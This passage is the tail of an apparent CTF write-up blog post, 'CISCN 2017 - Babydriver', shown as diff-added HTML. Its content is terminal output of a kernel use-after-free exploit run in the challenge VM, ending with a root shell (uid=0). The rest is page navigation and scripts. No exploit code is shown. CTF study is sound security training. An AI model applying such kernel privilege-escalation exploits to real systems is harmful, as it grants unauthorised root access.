or directory</span><br><span class="line">chmod: flag: No such file or directory</span><br><span class="line">[    4.155084] babydriver: module verification failed: signature and/or required key missing - tainting kernel</span><br><span class="line"></span><br><span class="line">Boot took 2.12 seconds</span><br><span class="line"></span><br><span class="line">/ $ ls</span><br><span class="line">bin          home         linuxrc      root         sbin         usr</span><br><span class="line">dev          init         proc         rootfs       sys</span><br><span class="line">etc          lib          result       rootfs.cpio  tmp</span><br><span class="line">/ $ cd tmp</span><br><span class="line">/tmp $ ls</span><br><span class="line">exploit</span><br><span class="line">/tmp $ ./exploit</span><br><span class="line">[   13.016238] device open</span><br><span class="line">[   13.019965] device open</span><br><span class="line">[   13.023654] alloc done</span><br><span class="line">[   13.027202] device release</span><br><span class="line">/tmp # id</span><br><span class="line">uid=0(root) gid=0(root) groups=1000(ctf)</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+    
+  </div>
+  
+    
+    <div class="copyright">
+        <p><span>제목:</span><a  href="/2019/11/01/kernelheap/">CISCN 2017 - Babydriver</a></p>
+        <p><span>저자:</span><a  href="/" title="访问 K4el 的个人博客">K4el</a></p>
+        <p><span>발행 시간:</span>2019년11월01일 - 22시46분</p>
+        <p><span>마지막 업데이트:</span>2019년11월02일 - 11시26분</p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a  href="/2019/11/01/linuxke/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">LINUX KERNEL PREVILEGE</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">Article directory</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#KERNEL-HEAP-ALLOCATION"><span class="toc-number">1.</span> <span class="toc-text">KERNEL HEAP ALLOCATION</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ANALYZE"><span class="toc-number">2.</span> <span class="toc-text">ANALYZE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#LINUX-KERNEL-UAF"><span class="toc-number">3.</span> <span class="toc-text">LINUX KERNEL UAF</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="숨기기"  title="点击按钮隐藏或者显示Article directory">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "숨기기";
+    var valueShow = "펼치기";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
+
+
+
+
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
+
+
+
+
+    
+        <section id="comments">
+  <div id="disqus_thread"></div>
+    <script type="text/javascript">
+    /* * * CONFIGURATION VARIABLES: EDIT BEFORE PASTING INTO YOUR WEBPAGE * * */
+    var disqus_shortname = 'k4el'; // required: replace example with your forum shortname
+    /* * * DON'T EDIT BELOW THIS LINE * * */
+    (function() {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    })();
+  </script>
+  <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</section>
+          <div id="disqus_thread"></div>
+          <script>
+          
+          /**
+          *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+          *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables*/
+          /*
+          var disqus_config = function () {
+          this.page.url = PAGE_URL;  // Replace PAGE_URL with your page's canonical URL variable
+          this.page.identifier = PAGE_IDENTIFIER; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+          };
+          */
+          (function() { // DON'T EDIT BELOW THIS LINE
+          var d = document, s = d.createElement('script');
+          s.src = 'https://blog-z2e4o6-com.disqus.com/embed.js';
+          s.setAttribute('data-timestamp', +new Date());
+          (d.head || d.body).appendChild(s);
+          })();
+          </script>
+          <noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+    
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a  href="/" title="HOME"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2019/11/01/linuxke/" title="下一篇: LINUX KERNEL PREVILEGE">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/11/01/kernelheap/">CISCN 2017 - Babydriver</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/01/linuxke/">LINUX KERNEL PREVILEGE</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/23/post-1/">Kernel Module</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/01/Hitcon-2016-babyheap/">Hitcon 2016 babyheap</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/DEFCON 2019 speedrun010/">Defcon 2019 speedrun 010</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/25/mmaloc/">Trust 2019 - mmalloc</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/16/post-3/">fsop - basic</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/05/11/post-2/">File Structure</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/04/03/heapbabe/">Codegate 2018 final heapbabe</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/25/0x00-ctf/">0x00_ctf_left</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/ropp/">Plaid CTF - ropasaurusrex</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/babypwn/">codegate 2017 CTF - babypwn</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/24/exploit-exercise-fusion-01/">exploit-exercise-fusion-01</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/exploit-exercise-fusion-00/">exploit_exercise_fusion_00</a></li><li class="post-list-item"><a class="post-list-link" href="/2018/09/23/gadget-searcher/">gadget_searcher</a></li></ul>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
+
+
+
+
+    <script>
+        
+    </script>
+
+
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                &copy; 2019 K4el
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank">Hexo &nbsp;&nbsp;</a><a href="https://github.com/maochunguang" target="_blank">Blog</a> by tommy
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit">페이지 방문: 
+                            <span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+
+    </div>
+    
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script src="/js/main.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var backgroundnum = 1;
+            var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+            $("#mobile-nav").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+            $(".left-col").css({"background-image": backgroundimg,"background-size": "cover","background-position": "center"});
+        })
+    </script>
+
+
+<!-- Google Analytics -->
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+})(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+ga('create', 'k3el', 'auto');
+ga('send', 'pageview');
+
+</script>
+<!-- End Google Analytics -->
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    $(document).ready(function() {
+        if ($("#comments").length < 1) {
+            $("#scroll > a:nth-child(2)").hide();
+        };
+    })
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+
+  <script language="javascript">
+    $(function() {
+        $("a[title]").each(function() {
+            var a = $(this);
+            var title = a.attr('title');
+            if (title == undefined || title == "") return;
+            a.data('title', title).removeAttr('title').hover(
+            function() {
+                var offset = a.offset();
+                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
+                    top: offset.top - a.outerHeight() - 15,
+                    left: offset.left + a.outerWidth()/2 + 1
+                }).fadeIn(function() {
+                    var pop = $(this);
+                    setTimeout(function() {
+                        pop.remove();
+                    }, pop.text().length * 800);
+                });
+            }, function() {
+                $("#anchortitlecontainer").remove();
+            });
+        });
+    });
+</script>
+
+
+
+  </div>
+</body>
+</html>
